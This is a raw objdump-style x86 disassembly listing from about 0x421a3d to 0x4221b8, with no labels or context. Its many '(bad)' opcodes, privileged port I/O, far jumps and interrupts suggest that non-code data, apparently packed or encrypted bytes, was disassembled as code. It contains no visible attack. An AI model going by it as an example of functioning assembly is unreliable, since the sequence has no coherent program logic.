  421a3d:	fdiv   DWORD PTR [edx]
  421a3f:	aas    
  421a40:	cmp    DWORD PTR [edi],eax
  421a42:	dec    eax
  421a43:	mov    ecx,0xaad9634f
  421a48:	xor    BYTE PTR [eax-0x58db659d],bh
  421a4e:	mov    ebp,0xf28bc1a4
  421a53:	lods   eax,DWORD PTR ds:[esi]
  421a54:	jge    0x421a0c
  421a56:	dec    ecx
  421a57:	push   esp
  421a58:	imul   ebx,ecx,0x380d40f3
  421a5e:	fnstsw WORD PTR [esi]
  421a60:	rol    dl,cl
  421a62:	test   ecx,ebp
  421a64:	xchg   esi,eax
  421a66:	into   
  421a67:	mov    WORD PTR [ebp+eax*8-0x6fbfed14],gs
  421a6e:	or     al,0x46
  421a70:	add    al,BYTE PTR [ecx-0x55bba1eb]
  421a76:	mov    WORD PTR [eax-0x2d],es
  421a79:	mov    ah,BYTE PTR [ebp-0x11]
  421a7c:	(bad)  [esi-0x65896b52]
  421a82:	push   es
  421a83:	cmp    dl,BYTE PTR [ebx+0x4c]
  421a86:	push   esi
  421a87:	call   0xced378fc
  421a8c:	int3   
  421a8d:	push   ds
  421a8e:	jb     0x421af6
  421a90:	mov    al,0x8a
  421a92:	push   0x640d48f4
  421a97:	sbb    BYTE PTR [ebp+0x37],ch
  421a9a:	std    
  421a9b:	inc    esi
  421a9c:	loop   0x421a3d
  421a9e:	and    eax,DWORD PTR [esi+0x52]
  421aa1:	ret    
  421aa2:	ins    DWORD PTR es:[edi],dx
  421aa3:	ja     0x421a85
  421aa5:	ffreep st(7)
  421aa7:	mov    al,0xba
  421aa9:	out    0x50,al
  421aab:	imul   edx,eax,0x4e
  421aae:	bound  ecx,QWORD PTR [edi-0x18]
  421ab1:	cmp    eax,DWORD PTR es:[edx]
  421ab4:	jns    0x421afa
  421ab6:	mov    al,0xbb
  421ab8:	lock jae 0x421ac8
  421abb:	dec    ebp
  421abc:	es sub bl,al
  421abf:	push   edi
  421ac0:	retf   0x7626
  421ac3:	out    0xa6,al
  421ac5:	ins    DWORD PTR es:[edi],dx
  421ac6:	in     eax,0xee
  421ac8:	sub    DWORD PTR [ebp+esi*8-0x43],edi
  421acc:	jge    0x421acf
  421ace:	mov    bl,0x93
  421ad0:	aam    0x6b
  421ad2:	inc    ebx
  421ad3:	adc    BYTE PTR ds:0x8a412cc3,0xcc
  421ada:	loopne 0x421ab0
  421adc:	popf   
  421add:	std    
  421ade:	xchg   edx,eax
  421adf:	jnp    0x421a9a
  421ae1:	aam    0x4a
  421ae3:	fild   QWORD PTR [ecx+0x32535948]
  421ae9:	jp     0x421a76
  421aeb:	jl     0x421b0b
  421aed:	pop    ecx
  421aee:	push   ss
  421aef:	out    0x9,al
  421af1:	int    0x3b
  421af3:	in     eax,0x43
  421af5:	push   es
  421af6:	mov    bh,0x44
  421af8:	dec    esp
  421af9:	sbb    DWORD PTR [ebp+edi*8-0x58],ecx
  421afd:	inc    esi
  421afe:	loope  0x421b59
  421b00:	retf   
  421b01:	push   edx
  421b02:	add    eax,DWORD PTR [ebx]
  421b04:	pushf  
  421b05:	ss je  0x421adf
  421b08:	or     ecx,DWORD PTR [eax]
  421b0a:	push   ds
  421b0b:	sub    ah,BYTE PTR [eax-0x8cd3ea3]
  421b11:	dec    edi
  421b12:	out    0x89,al
  421b14:	cmp    al,0x48
  421b16:	xlat   BYTE PTR ds:[ebx]
  421b17:	in     al,dx
  421b18:	in     al,dx
  421b19:	(bad)  
  421b1a:	xor    ah,BYTE PTR [esi-0x32]
  421b1d:	push   ds
  421b1e:	mov    ah,0xc3
  421b20:	scas   al,BYTE PTR es:[edi]
  421b21:	fnsave [edi]
  421b23:	mov    ebx,0x4a1434cc
  421b28:	test   BYTE PTR [edi],0x14
  421b2b:	lods   al,BYTE PTR ds:[esi]
  421b2c:	clc    
  421b2d:	retf   0xcd71
  421b30:	push   ebx
  421b31:	popa   
  421b32:	arpl   WORD PTR [edi],di
  421b34:	mov    ds:0xe70e0c15,al
  421b39:	loop   0x421af7
  421b3b:	(bad)  
  421b3c:	(bad)  
  421b3e:	test   eax,esi
  421b40:	or     al,BYTE PTR [esi]
  421b42:	enter  0x2172,0x64
  421b46:	xor    BYTE PTR [edi+0x55fe4032],cl
  421b4c:	ds test eax,0x4d5d6d10
  421b52:	inc    esi
  421b53:	mov    cl,0xac
  421b55:	cmp    ah,bl
  421b57:	imul   ebx,DWORD PTR [edi-0x26ef40f0],0x67
  421b5e:	mov    edi,0x356a5192
  421b63:	arpl   WORD PTR [edi-0x2e],cx
  421b66:	aad    0x16
  421b68:	push   eax
  421b69:	ins    BYTE PTR es:[edi],dx
  421b6a:	adc    ah,dl
  421b6c:	jne    0x421beb
  421b6e:	bnd jp 0x421b0a
  421b71:	fwait
  421b72:	inc    edx
  421b73:	push   ecx
  421b74:	les    edi,FWORD PTR [edx]
  421b76:	lock adc edx,esp
  421b79:	sub    ebp,DWORD PTR [ebx]
  421b7b:	cmp    bh,BYTE PTR cs:[edx-0x39]
  421b7f:	mov    esi,0xefe73f71
  421b84:	(bad)  
  421b85:	jle    0x421b46
  421b87:	adc    bl,cl
  421b89:	cmp    ah,BYTE PTR [edi-0x1e4c5565]
  421b8f:	mov    dl,0xb6
  421b91:	gs in  al,0x5d
  421b94:	xor    DWORD PTR [ebx-0x6736fa5],ebx
  421b9a:	hlt    
  421b9b:	fdivp  st(7),st
  421b9d:	push   esp
  421b9e:	cs pop esi
  421ba0:	sbb    eax,0xbf79095d
  421ba5:	jge    0x421bcc
  421ba7:	das    
  421ba8:	xor    al,0x3e
  421baa:	pushf  
  421bab:	pusha  
  421bac:	or     eax,0x8c1fd196
  421bb1:	mov    bh,0x64
  421bb3:	test   al,0xbd
  421bb5:	xor    edx,DWORD PTR ds:0x7defe3d5
  421bbb:	iret   
  421bbc:	cmp    edi,DWORD PTR cs:[edi+0x28]
  421bc0:	mov    edi,0x241606e3
  421bc5:	cmp    eax,0x9aa8a4c5
  421bca:	mov    ch,0x76
  421bcc:	fld    st(5)
  421bce:	sar    DWORD PTR [ecx+0x42],1
  421bd1:	imul   edx,DWORD PTR [ecx+0x19],0xffffffef
  421bd5:	mov    edi,0x5c26edfb
  421bda:	or     cl,dl
  421bdc:	aad    0x26
  421bde:	pop    ecx
  421bdf:	adc    eax,0x4fdaa1c4
  421be4:	mov    BYTE PTR [esp+eiz*4-0x6a],ch
  421be8:	fs jbe 0x421c66
  421beb:	adc    DWORD PTR [eax+0x45],0xffffffff
  421bef:	mov    bh,0xc8
  421bf1:	add    BYTE PTR ds:0x2f3264c2,bl
  421bf7:	xor    bl,BYTE PTR [ecx]
  421bf9:	push   ds
  421bfa:	loopne 0x421ba8
  421bfc:	jnp    0x421b9b
  421bfe:	and    DWORD PTR [ebx+0x59b6a30a],ecx
  421c04:	ins    DWORD PTR es:[edi],dx
  421c05:	xor    al,0x62
  421c07:	adc    al,0x1e
  421c09:	and    al,0x74
  421c0b:	mov    bh,0x65
  421c0d:	aaa    
  421c0e:	ret    
  421c0f:	push   0xffffffd9
  421c11:	sbb    al,0x55
  421c13:	(bad)  
  421c14:	push   esi
  421c15:	icebp  
  421c16:	push   edx
  421c17:	stos   BYTE PTR es:[edi],al
  421c18:	inc    eax
  421c19:	(bad)  
  421c1a:	ins    BYTE PTR es:[edi],dx
  421c1b:	shr    bl,0xe2
  421c1e:	xor    eax,0xcef6435b
  421c23:	cld    
  421c24:	xlat   BYTE PTR ds:[ebx]
  421c25:	js     0x421c5e
  421c27:	mov    bh,0xb9
  421c29:	cmp    cl,BYTE PTR [esi]
  421c2b:	loope  0x421bba
  421c2d:	shl    DWORD PTR [ebx*8+0x199a4bc],cl
  421c34:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421c35:	lock inc eax
  421c37:	push   ebp
  421c38:	mov    dl,0x8
  421c3a:	adc    eax,0x7c7a5f17
  421c3f:	ins    BYTE PTR es:[edi],dx
  421c40:	pop    edi
  421c41:	mov    ah,BYTE PTR [eax]
  421c43:	pop    esi
  421c44:	aas    
  421c45:	test   esi,esp
  421c47:	and    BYTE PTR [ebx+ebx*8+0x7b],cl
  421c4b:	jmp    0xd42267b6
  421c50:	mov    dh,0x65
  421c52:	data16 daa 
  421c54:	cwde   
  421c55:	mov    ch,0x87
  421c57:	sbb    bh,BYTE PTR [ebp+0x1d164882]
  421c5d:	mov    dh,0xae
  421c5f:	pop    eax
  421c60:	bound  esp,QWORD PTR [edi+0x16f917d8]
  421c66:	sbb    dl,cl
  421c68:	add    ah,BYTE PTR [ebp+edi*1-0x40]
  421c6c:	sar    BYTE PTR [edi+0x1bb9b569],0x5e
  421c73:	stos   BYTE PTR es:[edi],al
  421c74:	add    eax,DWORD PTR [ebp-0x26]
  421c77:	xor    BYTE PTR [esi],cl
  421c79:	push   esi
  421c7a:	pushf  
  421c7b:	cmp    eax,0xf576b0f6
  421c80:	les    edx,FWORD PTR [ecx+0x5138af2f]
  421c86:	test   BYTE PTR [esi-0x52e3ad13],0x55
  421c8d:	adc    al,0xe2
  421c8f:	das    
  421c90:	cmp    esp,edi
  421c92:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421c93:	mov    bh,0xf0
  421c95:	int3   
  421c96:	adc    al,0x4e
  421c98:	jl     0x421c75
  421c9a:	loopne 0x421cfa
  421c9c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421c9d:	ret    
  421c9e:	mov    al,BYTE PTR [esi+edi*8]
  421ca1:	or     eax,0x6143909d
  421ca6:	inc    ebx
  421ca7:	aad    0x65
  421ca9:	fnsave [ebp-0x2d]
  421cac:	ret    0x3ba6
  421caf:	mov    bh,0xf7
  421cb1:	lea    ebx,[edi+0x7d411e2d]
  421cb7:	sbb    eax,0xde2dc082
  421cbc:	gs mov edx,0xd9ee9c23
  421cc2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421cc3:	pushf  
  421cc4:	mov    edx,0xa9964013
  421cc9:	jmp    0xad9e:0x2c2eaf70
  421cd0:	push   eax
  421cd1:	pusha  
  421cd2:	stos   DWORD PTR es:[edi],eax
  421cd3:	leave  
  421cd4:	loope  0x421d49
  421cd6:	(bad)  
  421cd7:	test   al,0x42
  421cd9:	mov    cs,WORD PTR ds:0x9b3a85d9
  421cdf:	add    esp,DWORD PTR [ecx+eax*2-0x66]
  421ce3:	cdq    
  421ce4:	gs int 0x16
  421ce7:	mov    ?,WORD PTR [edi-0x54]
  421cea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421ceb:	mov    dh,0x1c
  421ced:	and    al,0x62
  421cef:	xor    DWORD PTR [edx+0x24],ebp
  421cf2:	mov    ch,0x57
  421cf4:	xor    eax,DWORD PTR [eax]
  421cf6:	mov    bh,BYTE PTR [edx-0x5495d4fa]
  421cfc:	pop    edi
  421cfd:	fdiv   st(2),st
  421cff:	dec    esp
  421d00:	in     eax,0x3f
  421d02:	and    ch,dl
  421d04:	inc    edi
  421d05:	push   ebp
  421d06:	ins    DWORD PTR es:[edi],dx
  421d07:	std    
  421d08:	sub    al,0xf3
  421d0a:	enter  0xcae6,0xe9
  421d0e:	retf   0xb4e3
  421d11:	xchg   edi,eax
  421d12:	sar    DWORD PTR [ebp-0x7e6d5de9],1
  421d18:	nop
  421d19:	popa   
  421d1a:	lss    edi,FWORD PTR [eax]
  421d1d:	push   es
  421d1e:	shr    BYTE PTR [eax],0xd6
  421d21:	sbb    BYTE PTR [ebx+ecx*8-0x12],0x47
  421d26:	jns    0x421d8c
  421d28:	sub    BYTE PTR [esi-0x4b],dl
  421d2b:	in     eax,0x38
  421d2d:	inc    ecx
  421d2e:	jge    0x421d94
  421d30:	mov    ah,0x61
  421d32:	js     0x421ce4
  421d34:	mov    ebx,DWORD PTR [edi]
  421d36:	aaa    
  421d37:	pop    edi
  421d38:	inc    ebp
  421d39:	xchg   DWORD PTR [ecx+0x50e77769],edi
  421d3f:	imul   ecx,DWORD PTR [edi],0x5ce242c8
  421d45:	dec    eax
  421d46:	mov    dh,BYTE PTR [ecx-0x27]
  421d49:	mov    bh,0x12
  421d4b:	pop    ds
  421d4c:	outs   dx,DWORD PTR ds:[esi]
  421d4d:	and    DWORD PTR [ecx-0x5b],ebp
  421d50:	data16 mov ah,bh
  421d53:	cli    
  421d54:	mov    al,BYTE PTR [ecx*8-0x7cf2283b]
  421d5b:	adc    BYTE PTR [ebx-0x2b434b32],dl
  421d61:	mov    ss,WORD PTR [esi]
  421d63:	sbb    al,0x24
  421d65:	or     al,0x46
  421d67:	into   
  421d68:	xor    DWORD PTR [edi+0x65],esp
  421d6b:	jg     0x421dd7
  421d6d:	out    dx,al
  421d6e:	sbb    bh,BYTE PTR [edx-0xdfc7371]
  421d74:	fcomp  QWORD PTR [edx]
  421d76:	xchg   DWORD PTR [ecx+0x2b],ebp
  421d79:	ins    DWORD PTR es:[edi],dx
  421d7a:	test   DWORD PTR [edx+0x48],eax
  421d7d:	stos   BYTE PTR es:[edi],al
  421d7e:	aaa    
  421d7f:	sub    eax,0xef608d51
  421d84:	or     al,0x5b
  421d86:	push   0x1dc66a0a
  421d8b:	call   0xed83272d
  421d90:	enter  0x24e3,0xa5
  421d94:	inc    esi
  421d95:	(bad)  
  421d96:	fnsave [eax+ebp*4]
  421d99:	clc    
  421d9a:	out    dx,al
  421d9b:	out    0xa6,eax
  421d9d:	arpl   WORD PTR [ebp-0x28],dx
  421da0:	adc    ah,BYTE PTR [esi+eax*2-0x5c]
  421da4:	cwde   
  421da5:	inc    ebx
  421da6:	fnstcw WORD PTR [eax-0xb501249]
  421dac:	repz mov al,bh
  421daf:	adc    DWORD PTR [ecx],esi
  421db1:	cld    
  421db2:	mov    DWORD PTR [ecx+0x61],edi
  421db5:	mov    ah,0xc5
  421db7:	stc    
  421db8:	test   DWORD PTR [eax-0x1f159149],edx
  421dbe:	cmp    al,0x8b
  421dc0:	test   dl,bl
  421dc2:	loopne 0x421d59
  421dc4:	out    0xad,eax
  421dc6:	or     al,0x5a
  421dc8:	enter  0x2a2c,0xbb
  421dcc:	adc    ecx,edi
  421dce:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  421dd0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421dd1:	xchg   esi,eax
  421dd2:	fsubr  DWORD PTR [edx-0x6f]
  421dd5:	and    al,ch
  421dd7:	xchg   esp,eax
  421dd8:	nop
  421dd9:	pop    edx
  421dda:	in     al,0xb8
  421ddc:	jb     0x421da3
  421dde:	push   0x9cca8c09
  421de3:	out    dx,al
  421de4:	cmc    
  421de5:	xchg   esp,eax
  421de6:	fnstsw WORD PTR [edx-0x34db1d55]
  421dec:	cdq    
  421ded:	aaa    
  421dee:	in     eax,0x86
  421df0:	sbb    BYTE PTR [ebx-0x19],0x92
  421df4:	imul   esi,DWORD PTR fs:[ebx-0x67a7e84c],0xe7bdf5ba
  421dff:	icebp  
  421e00:	fmul   QWORD PTR [edi]
  421e02:	adc    eax,0xba513f37
  421e07:	jne    0x421db6
  421e09:	adc    eax,0xcecf4a8c
  421e0e:	pop    ebx
  421e0f:	sub    ebp,DWORD PTR [edi]
  421e11:	into   
  421e12:	div    bl
  421e14:	dec    ebx
  421e15:	sub    BYTE PTR [edx-0x4b],bh
  421e18:	nop
  421e19:	mov    DWORD PTR [ecx+0x543f3116],ecx
  421e1f:	mov    ebp,0xf5ab4d5f
  421e24:	dec    eax
  421e25:	mov    dh,0x14
  421e27:	jmp    0x6187:0x74b496f6
  421e2e:	(bad)  
  421e30:	mov    DWORD PTR [edx-0x459a9920],ebx
  421e36:	mov    WORD PTR [eax-0x4ba9f8c1],gs
  421e3c:	or     ebx,eax
  421e3e:	scas   eax,DWORD PTR es:[edi]
  421e3f:	in     al,dx
  421e40:	pusha  
  421e41:	cs ret 0x77fe
  421e45:	cmp    BYTE PTR [ebx-0x68],0x85
  421e49:	pop    esp
  421e4a:	jae    0x421e2c
  421e4c:	icebp  
  421e4d:	mov    ah,0xb9
  421e4f:	cmp    al,0xa3
  421e51:	ins    BYTE PTR es:[edi],dx
  421e52:	shl    BYTE PTR [esi+0x5301903a],0x2c
  421e59:	into   
  421e5a:	adc    al,0x9
  421e5c:	mov    DWORD PTR [ebx+0x26],0x20409d
  421e63:	sbb    DWORD PTR [ecx-0x19],esp
  421e66:	push   ecx
  421e67:	mov    WORD PTR [ebp+0x3a6bdc4],fs
  421e6d:	mov    ch,0x6e
  421e6f:	mov    edx,0x6f08469b
  421e74:	lds    edx,FWORD PTR [ebx+0x21]
  421e77:	adc    ebx,DWORD PTR [esi+ebp*4]
  421e7a:	push   cs
  421e7b:	xchg   esp,eax
  421e7c:	das    
  421e7d:	bound  edx,QWORD PTR [edx+eiz*4]
  421e80:	push   edx
  421e81:	pop    ebp
  421e82:	add    eax,0x7c528f27
  421e87:	ins    DWORD PTR es:[edi],dx
  421e88:	xchg   edx,eax
  421e89:	seta   ah
  421e8c:	cld    
  421e8d:	dec    ebp
  421e8e:	shl    DWORD PTR [ebx+0x11],0xb2
  421e92:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421e93:	jne    0x421e8f
  421e95:	scas   eax,DWORD PTR es:[edi]
  421e96:	sub    eax,0x591d209c
  421e9b:	ins    DWORD PTR es:[edi],dx
  421e9c:	stos   DWORD PTR es:[edi],eax
  421e9d:	jg     0x421f0f
  421e9f:	daa    
  421ea0:	in     eax,dx
  421ea1:	pop    ebx
  421ea2:	mov    ss,WORD PTR [edi+ebx*4-0x3de3b731]
  421ea9:	inc    DWORD PTR [edx+0x0]
  421eac:	jnp    0x421e8b
  421eae:	pop    ebx
  421eaf:	push   eax
  421eb0:	iret   
  421eb1:	inc    edx
  421eb2:	mov    DWORD PTR es:[ebx-0x7db5626e],eax
  421eb9:	call   0x13c5:0xa9a43c9d
  421ec0:	ret    
  421ec1:	(bad)  
  421ec2:	jmp    0xf573:0xdfd45d38
  421ec9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421eca:	ja     0x421ef6
  421ecc:	push   cs
  421ecd:	or     DWORD PTR [ebx+0x2ddb70d3],edx
  421ed3:	imul   eax,DWORD PTR [ecx+edx*4],0xffffffa7
  421ed7:	inc    ecx
  421ed8:	pop    esi
  421ed9:	jle    0x421f44
  421edb:	xchg   ebx,eax
  421edc:	sti    
  421edd:	retf   0xc51e
  421ee0:	mov    esp,0x10c37
  421ee5:	add    BYTE PTR [edx],bl
  421ee7:	dec    ebp
  421ee8:	push   ss
  421ee9:	cmp    al,0xa2
  421eeb:	mov    ebp,0xa4813f48
  421ef0:	mul    DWORD PTR ds:0xc01abca2
  421ef6:	ds out dx,al
  421ef8:	stos   BYTE PTR es:[edi],al
  421ef9:	adc    eax,edx
  421efb:	outs   dx,BYTE PTR ds:[esi]
  421efc:	inc    edx
  421efd:	std    
  421efe:	ins    BYTE PTR es:[edi],dx
  421eff:	fisubr WORD PTR [ecx]
  421f01:	test   eax,0xd222523d
  421f06:	xchg   DWORD PTR [edx],ebx
  421f08:	stc    
  421f09:	lahf   
  421f0a:	mov    dl,0x76
  421f0c:	scas   al,BYTE PTR es:[edi]
  421f0d:	fldcw  WORD PTR [edx-0xe]
  421f10:	and    ah,cl
  421f12:	add    al,0xaa
  421f14:	pop    edx
  421f15:	xor    ebp,DWORD PTR [ebx]
  421f17:	std    
  421f18:	inc    ebp
  421f19:	pop    ss
  421f1a:	out    dx,eax
  421f1b:	pop    eax
  421f1c:	test   al,0xfd
  421f1e:	je     0x421ebd
  421f20:	xchg   ebx,eax
  421f21:	icebp  
  421f22:	pop    ss
  421f23:	mov    dh,0x33
  421f25:	(bad)  
  421f26:	scas   eax,DWORD PTR es:[edi]
  421f27:	or     dl,bh
  421f29:	or     dh,BYTE PTR [ebx]
  421f2b:	add    al,0x4b
  421f2d:	pushf  
  421f2e:	out    0xd8,al
  421f30:	sub    BYTE PTR [esi-0x88326e5],0xf1
  421f37:	xchg   ebx,eax
  421f38:	cmp    BYTE PTR [ebx-0x1c],dl
  421f3b:	push   ebp
  421f3c:	sti    
  421f3d:	aad    0xba
  421f3f:	add    DWORD PTR [eax-0x6940226b],ecx
  421f45:	push   edx
  421f46:	pop    ecx
  421f47:	aad    0x86
  421f49:	mov    ebx,0x774802e3
  421f4e:	lock (bad) [ecx]
  421f51:	pop    esi
  421f52:	int    0x1e
  421f54:	pop    ebx
  421f55:	jge    0x421f72
  421f57:	mov    cl,0x3a
  421f59:	call   0x599635c5
  421f5e:	push   0x9d8bdbe1
  421f63:	xor    dh,BYTE PTR [esi+0x7529209d]
  421f69:	sub    eax,ebx
  421f6b:	mov    al,0xec
  421f6e:	xchg   edx,eax
  421f6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421f70:	adc    eax,0xaa898960
  421f75:	push   0xffffff9c
  421f77:	jbe    0x421fb7
  421f79:	rcl    edi,cl
  421f7b:	jle    0x421fdc
  421f7d:	(bad)  
  421f7e:	icebp  
  421f7f:	mov    bl,0x5e
  421f81:	or     edx,DWORD PTR [esi+eiz*2-0x35]
  421f85:	xor    ah,BYTE PTR [edi+0x68]
  421f88:	rcl    DWORD PTR [ebx+0x23],0x55
  421f8c:	add    eax,DWORD PTR [edi+0x55]
  421f8f:	inc    ecx
  421f90:	outs   dx,BYTE PTR ds:[esi]
  421f91:	adc    eax,0x3960482c
  421f96:	jb     0x421f91
  421f98:	js     0x421fd0
  421f9a:	mov    ch,0x75
  421f9c:	adc    al,0xcc
  421f9e:	in     eax,0x5a
  421fa0:	scas   al,BYTE PTR es:[edi]
  421fa1:	addr16 inc esp
  421fa3:	rcl    DWORD PTR [ebp+0x57],0x4f
  421fa7:	add    al,0xeb
  421fa9:	jno    0x421fd3
  421fab:	cmp    DWORD PTR [ebx+esi*1+0x53],esi
  421faf:	idiv   BYTE PTR [ecx]
  421fb1:	xchg   esp,eax
  421fb2:	sbb    BYTE PTR [ebx+0x701cd7ac],0x41
  421fb9:	jp     0x421fbf
  421fbb:	jbe    0x421f4c
  421fbd:	stos   BYTE PTR es:[edi],al
  421fbe:	int3   
  421fbf:	cmp    eax,0xcf5b3b3e
  421fc4:	fidivr WORD PTR [esi-0x75]
  421fc7:	push   ecx
  421fc8:	add    eax,0x80bbe47
  421fcd:	retf   
  421fce:	inc    ecx
  421fcf:	and    eax,0x2ce69060
  421fd4:	js     0x42203c
  421fd6:	ins    BYTE PTR es:[edi],dx
  421fd7:	mov    ds,edx
  421fd9:	push   ebx
  421fda:	loop   0x422010
  421fdc:	xor    ebx,DWORD PTR ds:0x165ac579
  421fe2:	rcl    BYTE PTR [eax+0x73c37360],0xb1
  421fe9:	int    0x22
  421feb:	jecxz  0x422006
  421fed:	ret    
  421fee:	sbb    BYTE PTR [ebp+0x52cf92b8],al
  421ff4:	adc    al,ah
  421ff6:	mov    esi,0x787c3fdf
  421ffb:	mov    edx,0x7f7f3b9d
  422000:	loopne 0x421fe3
  422002:	xlat   BYTE PTR ds:[ebx]
  422003:	pop    esi
  422004:	test   DWORD PTR [esi],esi
  422006:	inc    esp
  422007:	cmp    BYTE PTR [ebp+0x2d84691e],al
  42200d:	ret    
  42200e:	mov    ecx,DWORD PTR [esp+ecx*4]
  422011:	popf   
  422012:	inc    ecx
  422013:	jp     0x422030
  422015:	sub    al,0xd
  422017:	add    al,0xa0
  422019:	imul   esi,DWORD PTR gs:[eax+0x204a8e13],0x17
  422021:	lods   eax,DWORD PTR ds:[esi]
  422022:	outs   dx,BYTE PTR ds:[esi]
  422023:	inc    esp
  422024:	push   ebp
  422025:	jg     0x421fe5
  422027:	jae    0x42202e
  422029:	popa   
  42202a:	popf   
  42202b:	dec    ebp
  42202c:	push   esi
  42202d:	dec    ecx
  42202e:	cmp    cl,ch
  422030:	adc    eax,0xdd8f52cf
  422035:	xchg   edx,eax
  422036:	fimul  WORD PTR [esi]
  422038:	loope  0x422022
  42203a:	mov    cl,0x21
  42203c:	in     al,dx
  42203d:	cmp    ebx,DWORD PTR [eax-0x5e]
  422040:	in     al,dx
  422041:	pop    esp
  422042:	cmp    al,0x8e
  422044:	add    edx,DWORD PTR [ebx-0x2b040c60]
  42204a:	and    BYTE PTR [eax-0x4037836d],bl
  422050:	push   ds
  422051:	xor    eax,0xe8ca8b03
  422056:	nop
  422057:	push   cs
  422058:	out    dx,eax
  422059:	popf   
  42205a:	lds    esi,FWORD PTR [esi]
  42205c:	ds inc ebx
  42205e:	sti    
  42205f:	jno    0x422028
  422061:	push   esp
  422062:	jg     0x42202f
  422064:	scas   eax,DWORD PTR es:[edi]
  422065:	and    ebx,DWORD PTR [esp+eax*1-0xf9dc1b]
  42206c:	shl    BYTE PTR [ecx+0x35],1
  42206f:	sahf   
  422070:	test   eax,0xea8e7087
  422075:	or     esp,0x862910b4
  42207b:	sbb    eax,0x106915a3
  422080:	xchg   ebx,eax
  422081:	in     al,0xa3
  422083:	pop    es
  422084:	xchg   edi,eax
  422086:	mov    bh,0xeb
  422088:	add    DWORD PTR [esi+0x58bb2c4b],esp
  42208e:	cmp    bp,WORD PTR [ebx]
  422091:	ja     0x42205f
  422093:	lahf   
  422094:	rcr    dh,1
  422096:	or     DWORD PTR [edi],eax
  422098:	aad    0x73
  42209a:	add    DWORD PTR [ebp+0x4c831ff0],ebx
  4220a0:	cmc    
  4220a1:	and    BYTE PTR [ecx+0x22435079],ah
  4220a7:	ds iret 
  4220a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4220aa:	daa    
  4220ab:	dec    ebx
  4220ac:	std    
  4220ad:	lods   eax,DWORD PTR ds:[esi]
  4220ae:	in     eax,0xef
  4220b0:	add    DWORD PTR [edx],ecx
  4220b2:	sub    BYTE PTR [ebp+eax*4-0x33],dl
  4220b6:	ins    BYTE PTR es:[edi],dx
  4220b7:	imul   edi,ebp,0x3d
  4220ba:	mov    BYTE PTR [edi+0x48],ah
  4220bd:	mov    ecx,0x89ae3762
  4220c2:	or     al,0x26
  4220c4:	mov    DWORD PTR [ebx-0x70],esi
  4220c7:	fisub  WORD PTR [ecx-0x499cb77b]
  4220cd:	arpl   WORD PTR [eax-0x5d],cx
  4220d0:	pop    edi
  4220d1:	pop    es
  4220d2:	pusha  
  4220d3:	jecxz  0x42209f
  4220d5:	jnp    0x4220fa
  4220d7:	mov    al,0xa7
  4220d9:	and    bl,BYTE PTR [edx-0x2f]
  4220dc:	ins    DWORD PTR es:[edi],dx
  4220dd:	cdq    
  4220de:	into   
  4220df:	cmp    esi,eax
  4220e1:	dec    esi
  4220e2:	lahf   
  4220e3:	push   edi
  4220e4:	(bad)  
  4220e5:	dec    ebx
  4220e6:	stos   BYTE PTR es:[edi],al
  4220e7:	sub    eax,eax
  4220e9:	or     DWORD PTR [edx-0x1adedffb],esp
  4220ef:	mov    bh,0x23
  4220f1:	mov    edi,0xd6cd615b
  4220f6:	ins    DWORD PTR es:[edi],dx
  4220f7:	sbb    ah,dl
  4220f9:	push   edx
  4220fa:	fnstcw WORD PTR [edx]
  4220fc:	sahf   
  4220fd:	push   eax
  4220fe:	fcom   DWORD PTR [eax+0x61]
  422101:	into   
  422102:	inc    BYTE PTR [esi-0x6d066fee]
  422108:	sbb    ch,BYTE PTR [edi-0x7b6c6c14]
  42210e:	and    bh,BYTE PTR [ebx]
  422110:	lds    eax,FWORD PTR [ebp-0x42]
  422113:	and    dh,ah
  422115:	xchg   dh,ch
  422117:	mov    ecx,0x6e4e5e56
  42211c:	int3   
  42211d:	jne    0x42210a
  42211f:	pop    ds
  422120:	xchg   ebx,eax
  422121:	jl     0x42216c
  422123:	dec    ebx
  422124:	cdq    
  422125:	push   ds
  422126:	int    0x67
  422128:	and    BYTE PTR [ebx-0x2621d6af],dh
  42212e:	lock int3 
  422130:	cmp    DWORD PTR [ecx-0x5],ecx
  422133:	test   eax,0x6e8efc53
  422138:	inc    ebx
  422139:	xor    eax,0x40710ea8
  42213e:	xchg   esi,eax
  42213f:	data16 fistp WORD PTR [ecx-0x4b]
  422143:	adc    DWORD PTR [esp+edx*4],edi
  422146:	(bad)  
  422147:	sti    
  422148:	scas   eax,DWORD PTR es:[edi]
  422149:	adc    cl,cl
  42214b:	ficom  WORD PTR [bx+si-0x34fe]
  422150:	enter  0x7a70,0x27
  422154:	cmp    al,0xf7
  422156:	mov    esp,0x37d7263
  42215b:	in     eax,dx
  42215c:	add    edx,DWORD PTR [edi]
  42215e:	imul   ebp,DWORD PTR [ebx-0x3d],0x9bced98d
  422165:	xchg   esp,eax
  422166:	mov    ds:0x2e66d2d8,al
  42216b:	inc    ebp
  42216c:	adc    dh,BYTE PTR [eax-0x198ece00]
  422172:	xor    eax,0xafda5535
  422177:	sub    ebp,DWORD PTR [ebx-0x7855ca49]
  42217d:	inc    edx
  42217e:	dec    esp
  42217f:	ss jge 0x4221cf
  422182:	out    0x3f,eax
  422184:	mov    cl,0x35
  422186:	aam    0xcc
  422188:	dec    esi
  422189:	stc    
  42218a:	fs jl  0x42212a
  42218d:	call   0x944d:0xa83a6895
  422194:	push   ecx
  422195:	ss mov esp,0x99535be3
  42219b:	xor    DWORD PTR [eax],ebx
  42219d:	push   esi
  42219e:	cmp    edx,esi
  4221a0:	sbb    esp,DWORD PTR [eax]
  4221a2:	or     al,0xbf
  4221a4:	in     eax,dx
  4221a5:	icebp  
  4221a6:	sub    ah,dl
  4221a8:	(bad)  
  4221a9:	mov    ds:0xcf930983,eax
  4221ae:	fadd   st(1),st
  4221b0:	dec    esp
  4221b1:	pop    ebp
  4221b2:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4221b4:	sbb    al,BYTE PTR [ebp+edi*4+0x55]
  4221b8:	jb     0x422216
